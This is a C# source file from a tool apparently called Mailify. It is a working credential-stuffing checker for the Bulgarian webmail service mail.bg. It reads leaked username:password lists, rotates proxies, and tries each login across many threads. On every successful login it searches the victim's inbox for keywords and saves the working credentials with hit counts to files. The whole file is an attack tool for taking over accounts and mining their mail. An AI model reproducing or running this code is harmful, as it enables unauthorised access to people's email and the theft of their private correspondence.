using Leaf.xNet;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net;
using System.Threading;
using static Mailify.ConsoleUtilities;
using System.Drawing;
using Console = Colorful.Console;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;
using System.Diagnostics;

namespace Mailify
{
    internal class MailBG_Scan
    {
        public static int proxyTimeout { get; set; } = 7000;
        public static ProxyType proxyType { get; set; } = ProxyType.HTTP;

        public static readonly object objsafe = new object();

        public static void Initialize(int maxThreads, int _proxyTimeout, ProxyType _proxyType)
        {
            proxyTimeout = _proxyTimeout;
            proxyType = _proxyType;

            new Thread(() => Variables.Inbox_title()).Start();

            ThreadPool.SetMinThreads(maxThreads, maxThreads);
            Thread[] threads1 = new Thread[maxThreads];
            for (int i = 0; i < maxThreads; i++)
            {
                threads1[i] = new Thread(() =>
                {
                    while (!Variables.combos.IsEmpty)
                    {
                        Variables.combos.TryDequeue(out string data);
                        Worker(data);
                    }
                });
                threads1[i].Start();
            }
            for (int i = 0; i < maxThreads; i++) threads1[i].Join();

            Thread.Sleep(-1);
        }
        static void Worker(string combo)
        {
            try
            {
                Variables.proxyIndex = Variables.proxyIndex >= Variables.proxies.Length ? 0 : Variables.proxyIndex;
                var proxy = Variables.proxies[Variables.proxyIndex];
                var credentials = combo.Split(new char[] { ':', ';', '|' }, StringSplitOptions.RemoveEmptyEntries);
                using (var req = new HttpRequest()
                {
                    KeepAlive = true,
                    IgnoreProtocolErrors = true,
                    Proxy = ProxyClient.Parse(proxyType, proxy)
                })
                {
                    req.Proxy.ConnectTimeout = proxyTimeout;
                    req.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(req.SslCertificateValidatorCallback,
                    new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));


                    var user = WebUtility.UrlEncode("" + credentials[0] + "");
                    var pass = WebUtility.UrlEncode("" + credentials[1] + "");


                    req.AddHeader("User-Agent", "Mozilla/5.0 (Linux; Android 5.1; HUAWEI RIO-L01 Build/HuaweiRIO-L01) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 bg.mail.mailbg");

                    var res0 = req.Post("https://mail.bg/auth/login", "urlhash=&rememberme=0&longsession=1&httpssession=1&jan_offset=3600&jun_offset=3600&cors_capable=0&user=" + user + "&pass=" + pass + "", "application/x-www-form-urlencoded");
                    string text0 = res0.ToString();

                    if (text0.Contains("http://mail.bg/forms/interests") || text0.Contains("http://mail.bg/idx"))
                    {
                       try
                        {
                            foreach (string keyword in File.ReadAllLines("Files//Keywords.txt"))
                            {
                                var OAID = req.Cookies.GetCookies("https://mail.bg/auth/login")["OAID"].Value;
                                var key = Functions.Base64Encode(keyword);
                                req.AddHeader("origin", "https://mail.bg");
                                req.AddHeader("referer", "https://mail.bg/idx");
                                req.AddHeader("sec-fetch-dest", "empty");
                                req.AddHeader("sec-fetch-mode", "cors");
                                req.AddHeader("sec-fetch-site", "same-origin");
                                req.AddHeader("sec-gpc", "1");
                                req.AddHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36");
                                req.AddHeader("x-requested-with", "XMLHttpRequest");

                                var res1 = req.Post("https://mail.bg/mailbox/index/format/json/folder/inbox/flag/search:subjectfrom:" + key + ",,/page/1", "inbox=", "application/x-www-form-urlencoded");
                                string text1 = res1.ToString();

                                var count = Functions.LR(text1, "search:subjectfrom:<key>,,\":[\"", "\"]},").FirstOrDefault();
                                if (count == null || count == "0")
                                {
                                    Variables.Custom++;
                                    Variables.Checked++;
                                    Variables.cps++;
                                    lock (Variables.WriteLock)
                                    {
                                        Variables.remove(combo);
                                        File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                                    }
                                }
                                else
                                {
                                    Variables.Valid++;
                                    Variables.Checked++;
                                    Variables.cps++;
                                    lock (Variables.WriteLock)
                                    {
                                        Variables.remove(combo);
                                        if (Config.kekr_UI == "LOG")
                                        {
                                            Console.WriteLine($"[+] " + combo + " | Keyword: " + keyword + " | Results: " + count, Color.Green);
                                        }
                                        File.AppendAllText(Variables.results + $"{keyword}.txt", combo + " | Keyword: " + keyword + " | Results: " + count + Environment.NewLine);
                                    }
                                }
                            }
                        }
                        catch
                        {
                            Variables.Custom++;
                            Variables.Checked++;
                            Variables.cps++;
                            lock (Variables.WriteLock)
                            {
                                Variables.remove(combo);
                                File.AppendAllText(Variables.results + "Customs.txt", combo + Environment.NewLine);
                            }
                        }
                    }
                    else if (text0.Contains("https://mail.bg/auth/message/type/wuserpass/user/"))
                    {
                        Variables.Invalid++;
                        Variables.Checked++;
                        Variables.cps++;
                        lock (Variables.WriteLock)
                        {
                            Variables.remove(combo);
                        }
                    }
                    else
                    {
                        Variables.combos.Enqueue(combo);
                        Variables.proxyIndex++;
                        Variables.Errors++;
                    }

                }
            }
            catch
            {
                Variables.combos.Enqueue(combo);
                Variables.proxyIndex++;
                Variables.Errors++;
            }
        }
    }
}